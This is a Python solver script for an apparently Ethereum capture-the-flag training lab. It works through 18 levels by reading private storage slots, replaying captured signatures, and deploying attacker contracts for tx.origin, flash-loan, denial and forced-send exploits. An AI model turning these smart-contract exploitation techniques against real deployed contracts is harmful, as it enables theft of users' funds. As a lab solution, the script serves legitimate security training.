import json, re, sys, urllib.request, urllib.parse, os
from web3 import Web3
from eth_account import Account

w3 = Web3(Web3.HTTPProvider('http://chain1:8545'))
APP = 'http://localhost:5000'
_raw = json.load(open('/usr/src/app/abi.json'))
ABI = {k: (v['abi'] if isinstance(v, dict) else v) for k, v in _raw.items()}
ATT = json.load(open('/tmp/attackers.json'))
acct = Account.from_key(open('/tmp/player.key').read().strip())
me = acct.address
GWEI = 10**9
TXLOG = []
NOTES = []


def note(*a):
    t = ' '.join(str(x) for x in a).strip()
    NOTES.append(t)
    print('   ' + t)


class _R307(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if code == 307:
            return urllib.request.Request(newurl, data=req.data, headers=req.headers, method=req.get_method())
        return super().redirect_request(req, fp, code, msg, headers, newurl)


_opener = urllib.request.build_opener(_R307)


def http(path, data=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    return _opener.open(urllib.request.Request(APP + path, body)).read().decode()


BASE = re.search(r'Base Address:\s*(0x[0-9a-fA-F]{40})', http('/')).group(1)
base = w3.eth.contract(address=BASE, abi=ABI['1000'])


def send(txn_or_fn, value=0, gasprice=None, to=None, label=None):
    p = {'chainId': 1337, 'from': me, 'nonce': w3.eth.getTransactionCount(me, 'pending'),
         'gas': 3_000_000, 'gasPrice': gasprice or 2 * GWEI, 'value': value}
    if hasattr(txn_or_fn, 'buildTransaction'):
        tx = txn_or_fn.buildTransaction(p)
    else:
        p['to'] = to
        p['data'] = txn_or_fn
        tx = p
    signed = acct.sign_transaction(tx)
    h = w3.eth.sendRawTransaction(signed.rawTransaction)
    r = w3.eth.waitForTransactionReceipt(h)
    if label is None:
        label = getattr(txn_or_fn, 'fn_name', None)
        if label:
            label += '(' + ', '.join(str(a)[:40] for a in (txn_or_fn.args or [])) + ')'
        else:
            label = 'despliegue de contrato'
    TXLOG.append({'label': label, 'hash': h.hex(), 'block': r.blockNumber, 'gasUsed': r.gasUsed,
                  'status': r.status, 'valueWei': value, 'gasPriceGwei': (gasprice or 2 * GWEI) / GWEI})
    if r.status != 1:
        raise RuntimeError('tx revertida: %s' % h.hex())
    return r


def deploy_attacker(name, *args, value=0):
    a = ATT[name]
    c = w3.eth.contract(abi=a['abi'], bytecode=a['bin'])
    r = send(c.constructor(*args), value=value)
    return w3.eth.contract(address=r.contractAddress, abi=a['abi'])


def read_string(addr, slot):
    data = bytes(w3.eth.getStorageAt(addr, slot))
    n = int.from_bytes(data, 'big')
    if n & 1 == 0:
        return data[:(data[31] // 2)].decode()
    length = (n - 1) // 2
    start = int.from_bytes(Web3.keccak(slot.to_bytes(32, 'big')), 'big')
    out = b''
    for i in range((length + 31) // 32):
        out += bytes(w3.eth.getStorageAt(addr, start + i))
    return out[:length].decode()


def slot_int(addr, slot):
    return int.from_bytes(bytes(w3.eth.getStorageAt(addr, slot)), 'big')


def deploy_level(level):
    html = http('/deploy', {'user_address': me, 'level': str(level)})
    m = re.search(r"contract_address = '(0x[0-9a-fA-F]{40})'", html)
    if not m:
        raise RuntimeError('no hay direccion en la respuesta: ' + re.sub('<[^>]+>', ' ', html)[:300])
    addr = Web3.toChecksumAddress(m.group(1))
    return w3.eth.contract(address=addr, abi=ABI[str(level)])


def sel(sig):
    return Web3.keccak(text=sig)[:4]


# ---------- niveles: cada uno devuelve la flag ----------
def L0(c):
    return c.functions.getFlag().call({'from': me})


def L1(c):
    assert c.functions.checkHash('4d186321c1a7f0f354b297e8914ab240').call() == 659
    return c.functions.finalChoice(32, 659).call({'from': me})


def L2(c):
    n = slot_int(c.address, 1)
    note('numero secreto leido del slot 1:', n)
    send(c.functions.darAlta(), value=10**12)
    send(c.functions.cambioPropiedad(n))
    return c.functions.getFlag().call({'from': me})


def L3(c):
    send(c.functions.safeguard('x', 'secret'))
    return c.functions.getFlag().call({'from': me})


def L4(c):
    att = deploy_attacker('OriginAttack', c.address, me)
    cabi = json.dumps(ATT['OriginAttack']['abi'])
    note('servidor:', http('/verify_origin_attack', {'caddress': att.address, 'cabi': cabi})[:80])
    return att.functions.read().call({'from': me})


def L5(c):
    n = slot_int(c.address, 3)
    note('numero secreto leido del slot 3:', n)
    send(c.functions.pagarBoleto(), value=10**6)
    send(c.functions.ganarLottery(n))
    return c.functions.getFlag().call({'from': me})


def L6(c):
    send(c.functions.burning(1))
    note('mytokens =', c.functions.mytokens().call({'from': me}))
    return c.functions.getFlag().call({'from': me})


def L7(c):
    bn = c.functions.blocknumber().call()
    s = bytes(sel('set_flag(string)'))
    for t in w3.eth.getBlock(bn, True).transactions:
        if t['to'] and t['to'].lower() == c.address.lower() and Web3.toBytes(hexstr=t['input'])[:4] == s:
            return c.decode_function_input(t['input'])[1]['_flag']
    raise RuntimeError('no encontre la tx set_flag')


def L8(c):
    f = w3.eth.contract(address=c.functions.f().call(), abi=ABI['1002'])
    S = c.functions.getStamina().call({'from': me})
    note('stamina inicial =', S)
    run = lambda sig: send(c.functions.execution_function(bytes(sel(sig))))
    run('setOwner()')
    run('addPower()')
    cur = S
    while cur > 4:
        run('delStamina()'); cur -= 1
    while cur < 4:
        run('addStamina()'); cur += 1
    run('addStaminaToPower()')
    note('power =', c.functions.getPower().call({'from': me}))
    return c.functions.getFlag().call({'from': me})


def L9(c):
    token = c.functions.token().call()
    att = deploy_attacker('FlashAttack', c.address, token)
    send(att.functions.start(2 * 10**18))
    return att.functions.flag().call()


def L10(c):
    fee = c.functions.minimunFee().call()
    note('minimunFee =', fee)
    att = deploy_attacker('DenyAttack')
    send(att.functions.go(c.address, 1), value=fee * 6)
    return att.functions.flag().call()


OPTS = ["8f6c696b", "fd459d96", "2d175f11", "04867e32", "85f2aef2"]
NAMES = ["jump", "loveisintheair", "gameover", "ideaslocas", "team"]


def L11(c):
    n = slot_int(c.address, 3)
    note('indice secreto leido del slot 3:', n)
    send(c.functions.nostradamus(OPTS[n], NAMES[n]))
    return c.functions.getFlag().call({'from': me})


def L12(c):
    bn = c.functions.blockNumber().call()
    s = bytes(sel('deposit(bytes32,uint8,bytes32,bytes32)'))
    for t in w3.eth.getBlock(bn, True).transactions:
        if t['to'] and t['to'].lower() == c.address.lower() and Web3.toBytes(hexstr=t['input'])[:4] == s:
            a = c.decode_function_input(t['input'])[1]
            note('firma reutilizada del deposito del bloque', bn)
            send(c.functions.extractFunds(a['_hashedMessage'], a['_v'], a['_r'], a['_s']))
            return c.functions.getFlag().call({'from': me})
    raise RuntimeError('no encontre el deposito')


def L13(c):
    n = slot_int(c.address, 1)
    note('numero secreto leido del slot 1:', n)
    numbers = w3.eth.contract(abi=ABI['1005'])
    data = numbers.encodeABI(fn_name='guess', args=[n])
    send(c.functions.execution_function(Web3.toBytes(hexstr=data)))
    return c.functions.getFlag().call({'from': me})


def L14(c):
    send(c.functions.payMe(), value=10**8)
    return c.functions.getFlag().call({'from': me})


def L15(c):
    A = w3.eth.contract(address=c.functions.tokenA().call(), abi=ABI['1007'])
    send(c.functions.mintA(10))
    send(A.functions.approve(c.address, 10))
    send(c.functions.swapAforB(10))
    send(c.functions.mintA(20))
    note('A =', c.functions.balanceA().call({'from': me}), ' B =', c.functions.balanceB().call({'from': me}))
    return c.functions.getFlag().call({'from': me})


def L16(c):
    send(c.functions.add(40, 60), gasprice=5 * GWEI)
    return c.functions.getFlag().call({'from': me})


def L17(c):
    deploy_attacker('ForceSend', c.address, value=10)
    note('balance del contrato =', w3.eth.getBalance(c.address))
    return c.functions.getFlag().call({'from': me})


SOLVERS = {i: globals()['L%d' % i] for i in range(18)}

if __name__ == '__main__':
    if not base.functions.existPlayer(me).call():
        send(base.functions.addPlayer())
        print('jugador registrado:', me)
    levels = [int(x) for x in sys.argv[1:]] or list(range(18))
    EV = {}
    for lv in levels:
        try:
            del TXLOG[:]; del NOTES[:]
            c = deploy_level(lv)
            flag = SOLVERS[lv](c)
            send(base.functions.validateFlag(c.address, flag), label='validateFlag(contrato, flag)')
            ok = base.functions.checkFlag(c.address, me).call()
            EV[lv] = {'contract': c.address, 'flag': flag, 'flagOK': ok, 'notes': list(NOTES), 'txs': list(TXLOG)}
            json.dump(EV, open('/tmp/evidencia.json', 'w'), indent=1)
            print('NIVEL %2d  contrato %s  flagOK=%s' % (lv, c.address, ok))
        except Exception as e:
            print('NIVEL %2d  FALLO: %s' % (lv, str(e)[:300]))
